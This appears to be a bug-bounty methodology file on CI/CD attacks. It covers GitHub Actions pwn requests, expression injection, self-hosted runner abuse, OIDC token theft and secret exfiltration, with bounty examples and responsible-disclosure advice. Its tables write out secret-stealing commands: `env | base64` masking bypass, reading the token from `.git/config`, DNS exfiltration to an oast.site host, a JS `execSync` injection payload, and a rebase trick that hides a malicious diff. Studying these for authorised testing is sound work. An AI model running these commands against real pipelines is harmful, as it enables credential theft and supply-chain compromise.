---
name: cicd-security
category: vulnerabilities
description: CI/CD security testing for GitHub Actions injection, workflow poisoning, artifact tampering, secret extraction, and OIDC token theft
depends_on: []
---

# CI/CD Security

Exploiting CI/CD pipelines to achieve code execution, secret extraction, supply chain compromise, and lateral movement. CI/CD systems run with high privileges and often trust untrusted input from pull requests, issues, and commit messages.

## Discovery Signals

| Signal | Where to Find | What It Means |
|--------|--------------|---------------|
| `pull_request_target` in workflow YAML | `.github/workflows/*.yml` | Privileged context runs on fork PRs — canonical pwn request surface |
| `workflow_run` trigger | `.github/workflows/*.yml` | Inherits base repo permissions; artifact download path exploitable |
| `issue_comment` trigger + PR checkout | `.github/workflows/*.yml` | Comment-triggered workflows that act on PR code |
| `runs-on: self-hosted` on public repo | `.github/workflows/*.yml` | Any fork PR gets RCE on target infra — near-automatic finding |
| `id-token: write` permission | `permissions:` block in workflow | OIDC federation to cloud — token theft yields cloud account access |
| Missing `permissions:` block | Workflow top-level | Full default token (contents:write, packages:write) |
| `persist-credentials: true` (default) | `actions/checkout` step | GITHUB_TOKEN written to `.git/config` on runner filesystem |
| `${{ github.event.* }}` in `run:` step | Any workflow step | Expression injection — shell command injection via PR title/body/branch |
| `${{ env.MESSAGE }}` in `github-script` | `actions/github-script` steps | JavaScript injection — context expression interpolated as JS code |
| `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` | Checkout step in `pull_request_target` | Fork code checked out in privileged context |
| Auto-label bot + `types: [labeled]` gate | Workflow trigger config | Label-gated workflow bypassable via attacker-crafted PR title |
| `uses: org/action@v1` (tag, not SHA) | Action references | Mutable tag — upstream compromise propagates to all consumers |

## GitHub Actions Attack Matrix

| Trigger | Vulnerability | Payload | Impact |
|---------|--------------|---------|--------|
| `pull_request_target` + PR checkout | Pwn request — fork code runs with base secrets | Modify `package.json` postinstall or `.kokoro/build.sh` | GITHUB_TOKEN exfil, cloud creds via OIDC, repo write ($3.1M Google VRP) |
| `pull_request_target` + `github-script` | JS injection via context expression interpolation | `main_repo: "aa'+require('child_process').execSync(atob('...')).toString()+'bb"` in project.yaml | PR label manipulation, merge-approval spoofing ($50K OSS-Fuzz) |
| `issue_comment` + PR checkout | Comment triggers checkout of attacker-controlled PR code | `/build` comment on PR with modified test files | Service account credential theft ($7.5K Google Flank) |
| `workflow_run` + artifact download | Artifact smuggling from fork-triggered parent workflow | Malicious artifact replaces build output between jobs | Code injection in release pipeline |
| `pull_request_target` + Dependabot confusion | `synchronize` event on Dependabot PR from attacker fork | `package.json` injection via `actions/setup-node` cache | Upstream action tag poisoning, supply chain cascade ($7.5K Google) |
| Self-hosted runner on public repo | Fork PR runs on target infrastructure | `run: env \| grep -iE 'token\|key\|secret'` | Internal network access, cached creds, lateral movement ($10K Meta/PyTorch) |
| Auto-label bypass + `types: [labeled]` | Label gate bypassed via PR title regex match | PR title `"spanner: ignored"` matches auto-label pattern | Triggers privileged workflow on fork PR ($10K Google) |
| Missing `permissions:` block | Default token has full write scopes | Any injection yields contents:write, packages:write | Push to main, publish releases, modify branch protections |
| `persist-credentials: true` (default) | Token written to `.git/config` readable by any step | `find $HOME/work -name config \| xargs cat` | Token exfil even without env var access |
| Unpinned action `@main` or `@v1` | Upstream author pushes malicious commit | Action code modified to exfil secrets | Silent supply chain compromise on next build |
| Composite action with `${{ inputs.* }}` | Input injection through action parameters | Attacker-controlled action input reaches shell | RCE in consumer workflow context |

## CI Secret Exfiltration Techniques

| CI System | Technique | Where | Impact |
|-----------|-----------|-------|--------|
| GitHub Actions | `env \| base64` (masking bypass via encoding) | `run:` step in compromised workflow | All repo/org secrets in the job context |
| GitHub Actions | `find $HOME/work -name config \| xargs cat` | Post-checkout step | GITHUB_TOKEN from `.git/config` |
| GitHub Actions | `ACTIONS_RUNTIME_TOKEN` + cache API | Any step in the job | Access to workflow run cache (may contain secrets from other jobs) |
| GitHub Actions | OIDC `ACTIONS_ID_TOKEN_REQUEST_TOKEN` | Step with `id-token: write` | Cloud credentials via federation (AWS/GCP/Azure) |
| Jenkins | `/script` Groovy console (if anonymous access) | Web UI | Full Jenkins host RCE, all credentials |
| Jenkins | Build console output / env vars | Public build logs | API keys, deploy tokens, registry creds |
| GitLab CI | `CI_JOB_TOKEN` in fork MR pipeline | Runner environment | GitLab API access, package registry write |
| GitLab CI | Shared runner cache poisoning | `.gitlab-ci.yml` cache config | Code injection in other projects sharing the runner |
| Self-hosted runner | `~/.aws/credentials`, `~/.kube/config`, `~/.ssh/*` | Runner filesystem | Cloud account, cluster, SSH access |
| Self-hosted runner | `~/.docker/config.json` | Runner filesystem | Container registry push access |
| Any CI | DNS exfil: `dig $(env\|base64\|cut -c1-60).oast.site` | Restricted egress environments | Secret extraction bypassing HTTP firewalls |
| Any CI | Character splitting: `echo ${SECRET:0:1} ${SECRET:1:1}...` | Build logs | Bypass secret masking one character at a time |

## Defense-Bypass Pairs

| Defense | Bypass | Corpus Evidence |
|---------|--------|----------------|
| `types: [labeled]` gate on workflow | Auto-label bot adds labels based on PR title regex — attacker controls title | #465461248 ($10K) — `"spanner: ignored"` title triggers auto-label |
| `if: github.actor == 'dependabot[bot]'` | Dependabot actor confusion — send `synchronize` on existing Dependabot PR from fork | #3317400079 ($7.5K) — Release-Drafter compromise |
| Secret masking in logs | `base64`, hex encoding, character splitting bypass masking | Common pattern across multiple reports |
| `permissions: read-all` on workflow | Separate workflow with broader permissions triggered via `workflow_run` | Chained workflow escalation |
| Branch protection rules | Unicode homoglyphs in branch names, same-name branch confusion | Git branch name collision attacks |
| "First-time contributor" approval gate | One trivial merged PR makes attacker "non-first-time" — bypasses gate | #582734050 ($10K) — Meta/PyTorch self-hosted runners |
| Annotation-level sanitizer on ingress-nginx | Use sibling annotation not in the sanitizer's allowlist | K8s ingress annotation drift (same principle applies to Actions) |
| Network egress restrictions on runner | DNS exfiltration (recursive resolvers almost always reachable) | Standard technique in dep-confusion and CI exfil reports |
| PR diff review (human) | `git rebase -i HEAD^ && git push -f` hides diff after workflow already triggered | #582734050 — interactive rebase UI evasion |

## Chain Patterns

| Chain | Steps | Bounty Evidence |
|-------|-------|-----------------|
| Pwn request → cloud compromise | Fork PR triggers `pull_request_target` → malicious code runs with `id-token: write` → OIDC token exchanged for AWS/GCP creds → cloud account access | #716024320 ($3.1M) — 9 GCP projects via magic-modules |
| Self-hosted runner → internal network | Fork PR runs on self-hosted runner → enumerate `~/.kube/config`, `~/.aws/*`, internal DNS → pivot to internal services | #582734050 ($10K) — PyTorch CI fleet at Meta |
| JS injection → merge-approval spoofing | Context expression injection in `github-script` → steal `pull-requests: write` token → add `Ready to merge` label + spoof approval comments → force-push malicious payload | #464313344 ($50K) — OSS-Fuzz PR helper |
| Upstream action compromise → supply chain cascade | Compromise popular reusable action via Dependabot confusion → poison mutable tag → all downstream consumers pull backdoored action | #3317400079 ($7.5K) — Release-Drafter to Google Accompanist |
| Exposed Jenkins → full infra | Subdomain enum finds `jenkins.*` → anonymous access → build logs contain AWS creds → cloud account compromise | #231460 ($15K) — Snapchat prod Jenkins |
| Token exfil → repo write → release poison | Steal GITHUB_TOKEN with `contents: write` → push backdoor to `main` → next release includes malicious code → all downstream users affected | Standard supply chain escalation pattern |
| Label bypass → privileged workflow → OIDC | Craft PR title to trigger auto-label → label triggers `pull_request_target` workflow → exfil `id-token: write` OIDC token | #465461248 ($10K) — AlloyDB Java Connector |
| Gato-X scale scan → indirect injection | Automated scan of 20K+ repos → identify indirect context expression flows through step outputs → manual validation of multi-step injection chains | #1805589282 ($7.5K) — Google Flank |

## Methodology

### Step 1: Enumerate Workflows
1. List all `.github/workflows/*.yml` in every public repo in scope
2. Use Gato-X pattern: `site:github.com inurl:workflows +"self-hosted"` for self-hosted runners
3. Sourcegraph search: `file:\.github/workflows lang:yaml pull_request_target` at scale

### Step 2: Classify Triggers by Risk
- **Critical**: `pull_request_target` with PR checkout, `issue_comment` with PR checkout, self-hosted runners on public repos
- **High**: `workflow_run` with artifact download, missing `permissions:` block, `id-token: write`
- **Medium**: Unpinned action references, `persist-credentials: true` default

### Step 3: Trace Data Flow
- For each `${{ github.event.* }}` in a `run:` step, trace the full path including intermediate outputs, conditionals, and step variables
- For `actions/github-script`, check if context expressions are interpolated as JS (vs `process.env.X` which is safe)
- Indirect injections through step outputs are higher-yield because they survive 3+ years undetected

### Step 4: Check Action References
- Pinned to SHA (`@abc123`) — safe
- Tag (`@v1`) — mutable, upstream compromise propagates
- Branch (`@main`) — most dangerous
- `grep -rE 'uses: [^@]+@(main|master|v[0-9]+)$' .github/workflows/`

### Step 5: Test Self-Hosted Runners
- Submit benign PR with `run: hostname && whoami && env | grep -iE 'CI|RUNNER'`
- Check if CI runs without maintainer approval (non-first-time contributor bypass)
- Document: hostname pattern, network position, cached credentials (names only)

## Validation

1. Concrete workflow file path and line with the vulnerable trigger/checkout/injection
2. Fork repo and open benign PR with OAST callback in test/build step
3. Proof callback fired from CI infra (GitHub Actions IP range, runner hostname, timing)
4. List secrets accessible to the job (names from `env` dump, not values)
5. Impact narrative: what token scopes, what cloud access, what write permissions

## False Positives

- `pull_request` (not `_target`) — runs in fork context with no secrets
- `pull_request_target` but checkout of base ref only (no PR code execution)
- `permissions: read-all` or explicitly empty — token has no write scopes
- Self-hosted runner with `if: github.repository_owner == 'org'` gate AND ephemeral lifecycle
- `actions/github-script` using `process.env.X` (safe) vs `${{ env.X }}` interpolation (unsafe)

## Pro Tips

1. `pull_request_target` is not inherently bad — only checkout-and-execute of PR code is. Read the whole job before claiming
2. Indirect injection through step outputs and conditionals is higher-yield than textbook `${{ github.event.title }}` — most direct patterns are already patched in high-value repos
3. Gato-X-style scale scanning (20K+ repos via Sourcegraph, filter by triggers, human triage) finds bugs that survive 3+ years in top programs
4. Auto-label bots create phantom security gates — always check what triggers label application before trusting `types: [labeled]` as a control
5. Dependabot actor confusion is a current-generation primitive — any `if: github.actor == 'dependabot[bot]'` guard is bypassable
6. The interactive-rebase UI trick (`git rebase -i HEAD^ && git push -f`) hides the malicious diff after the workflow already triggered — converts noisy attack into stealthy one
7. `persist-credentials: true` is the default in `actions/checkout` — token leaks to `.git/config` even when not in env vars
8. When triage says "by design" for self-hosted runners, demonstrate post-exploitation reach (secrets, lateral movement) — that is where the real bounty is
9. Two-hop supply chain attacks (compromise upstream action → poison mutable tag → affect all downstream consumers) have exponential blast radius
10. Never exfil actual secrets. Show `env | cut -c1-10` to prove existence and prefix, stop there. Offer immediate PR deletion and branch cleanup
11. OIDC trust policies on cloud providers are frequently copy-pasted with `ref:refs/*` — worth auditing even when the Actions workflow looks safe
12. Report window matters — many Actions bugs are fixed within hours once publicly reported. Coordinate disclosure

## Summary

CI/CD bugs pay because a single pipeline misconfiguration compromises every downstream consumer. The highest-bounty findings ($3.1M, $50K, $15K, $10K) are live misconfigurations in public repos: `pull_request_target` with PR checkout, self-hosted runners, and indirect context expression injection. Focus on scale scanning (Sourcegraph, Gato-X pattern), trace data flow through multi-step workflows for indirect injections, and prove impact with benign OAST callbacks showing token scopes and cloud access.
